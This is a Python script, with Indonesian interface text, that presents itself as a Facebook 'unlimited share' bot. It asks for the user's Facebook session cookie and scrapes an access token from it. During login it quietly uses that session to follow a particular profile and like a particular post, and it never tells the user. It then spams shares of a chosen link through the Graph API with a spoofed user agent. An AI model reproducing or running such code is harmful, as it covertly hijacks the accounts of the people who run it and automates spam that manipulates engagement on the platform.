# Coded by Dikidjatar

import os, random, time, datetime, re, json
from rich import print
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
import requests

def banner():
   print(Panel('''
   ▄▀█ █ █ ▀█▀ █▀█   █▀▀ █ █ ▄▀█ █▀█ █▀▀   █▀▀ ▄▀█ █▀▀ █▀▀ █▄▄ █▀█ █▀█ █▄▀
   █▀█ █▄█  █  █▄█   ▄▄█ █▀█ █▀█ █▀▄ ██▄   █▀  █▀█ █▄▄ ██▄ █▄█ █▄█ █▄█ █ █

                              [bold cyan]TOOLS BY MIKYY
''', style="bold white", width=81))
# do not change author name!
def clear_layar():
   try:os.system('cls' if os.name == 'nt' else 'clear')
   except:pass

def remove():
   try:os.system('rm Data/cookie.txt')
   except:pass

def login():
   clear_layar()
   banner()
   print(Panel("                   [italic white]Silahkan Masukan[italic yellow] Cookie[italic white] Facebook Anda!", style="bold white", width=81))
   cookie = Console().input("[bold green] $ ")
   try:
      with requests.Session() as r:
         r.headers.update({
            'sec-fetch-mode': 'navigate',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'none',
            'accept-language': 'en-US,en;q=0.9',
            'sec-fetch-dest': 'document',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
            'Host': 'mbasic.facebook.com',
         })
         djatar = r.get('https://mbasic.facebook.com?_rdr', cookies = {
            'cookie': cookie
         }).text
         if 'id="mbasic_logout_button">' in str(djatar):
            resdtr = r.get('https://www.facebook.com/daisyoxie/', cookies={'cookie':cookie}).text
            uri_lk = re.search('href="(/a/subscribe.php?[^"]+)"', str(resdtr))
            if uri_lk is not None:
               uri_lk = uri_lk.group(1).replace('amp;', '')
               r.get('https://mbasic.facebook.com{}'.format(uri_lk), cookies={'cookie':cookie})
            urlpost = '/100010450276658/xxxx/?substory_index=xxxx'
            respon_urlpost = r.get('https://mbasic.facebook.com{}'.format(urlpost), cookies = {
               'cookie': cookie
            }).text
            find_urllike = re.search('href="(/a/like.php?[^"]+)"', str(respon_urlpost))
            if find_urllike is not None:
               find_urllike = find_urllike.group(1).replace('amp;', '')
               r.get('https://mbasic.facebook.com{}'.format(find_urllike), cookies = {
                  'cookie': cookie
               })
            url = "https://business.facebook.com/business_locations"
            head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
            cok = {'cookie':cookie}
            data = requests.Session().get(url,headers=head,cookies=cok)
            token = re.search('(EAAG\w+)',data.text).group(1)
            open('Data/cookie.txt', 'w').write(cookie)
            open('Data/token.txt', 'w').write(token)
            print(Panel('[bold green]Berhasil Login! [bold yellow]Tolong Gunakan Script Ini Dengan Bijak, Gunakan Akun TUMBAL!', width=55))
            time.sleep(3)
            choose()
         else:
            print(Panel('[bold red]Gagal Mengambil Data, Kemungkinan [bold yellow]Cookie [bold red] Anda Sudah Kedaluarsa, Silahkan Ganti [bold yellow] Cookie [bold red]Baru.', style="bold white", width=55));time.sleep(5);login()
   except Exception as e:
      print(e)

def choose():
   clear_layar()
   banner()
   print('''

 [bold yellow][00] Keluar
 [bold blue][01] Bot Share Postingan Unlimited
 [bold cyan][02] Ganti Cookie
''')
   pilihan = Console().input('[bold green] $ ')
   if pilihan in ['']:
      print(Panel('[bold red]Anda Harus Memilih, Tidak Boleh Kosong!', style="bold red", width=80));time.sleep(3);choose()
   elif pilihan in ['0', '00']:logout()
   elif pilihan in ['1', '01']:main()
   elif pilihan in ['2', '02']:remove();login()
   else:
      print(Panel('[bold red]Pilihan Anda Salah, Anda Harus Memilih Antara [bold green]0, 1 [bold red] dan [bold green]2'));time.sleep(3);choose()
   
for dtr in range(1000):
    ua1 = f"Mozilla/5.0 (Linux; Android {str(random.randint(7,12))}; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(73,99))}.0.{str(random.randint(4500,4900))}.{str(random.randint(75,150))} Mobile Safari/537.36"
    ua2 = f"Mozilla/5.0 (Linux; Android 7.0; SM-G935T Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.{str(random.randint(2500,3000))}.{str(random.randint(75,150))} Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]"
    ua3 = f"Mozilla/5.0 (Linux; Android 9.0; RMX1941 Build/PPR1.{str(random.randint(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(73,99))}.0.{str(random.randint(2500,2900))}.{str(random.randint(75,150))} Mobile Safari/537.36"
    user_agent = random.choice([ua1,ua2,ua3])
   
def main():
   try:
      cok = open('Data/cookie.txt', 'r').read()
      token = open('Data/token.txt', 'r').read()
      cookie = {'cookie': cok}
   except:
      print(Panel('[bold yellow]Login dulu ngab...'))
      time.sleep(3);login()
   print(Panel("[bold cyan]Masukan Link Postingan Target", width=40))
   link = Console().input("[bold green]  > ")
   print(Panel("[bold cyan]Jumlah Share", width=40))
   jumlah = int(Console().input("[bold green]  > "))
   print(Panel('[bold blue]Share Sedang Berjalan, [bold yellow] Tekan ctrl+c [bold blue] Untuk Berhenti.', width=40))
   try:
      n = 0
      header = {
         "authority":"graph.facebook.com",
         "cache-control":"max-age=0",
         "sec-ch-ua-mobile":"?0",
         "user-agent":user_agent
      }
      for i in range(jumlah):
         n += 1
         post = requests.Session().post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
         data = json.loads(post)
         if 'id' in post:
            print(Panel(f'''[bold blue]({n}) [bold white]Status: [bold green]Success
 [bold white]Link: [bold green]{link}
 [bold blue]-----------------------------------------------------
 [bold green]{user_agent}'''))
      try:
         print(Panel(f'[bold white]Share Selesai Dengan Jumlah [bold green]{n}'))
      except:pass
      else:
         exit()
   except Exception as e:
      print(e);exit()
      
def logout():
   print(Panel('[bold cyan]Terimakasih!'));time.sleep(2)
   try:os.system('xdg-open https://xfr.facebook.com/0')
   except:pass

if __name__ == '__main__':
   try:os.system('mkdir Data')
   except:pass
   try:choose()
   except:pass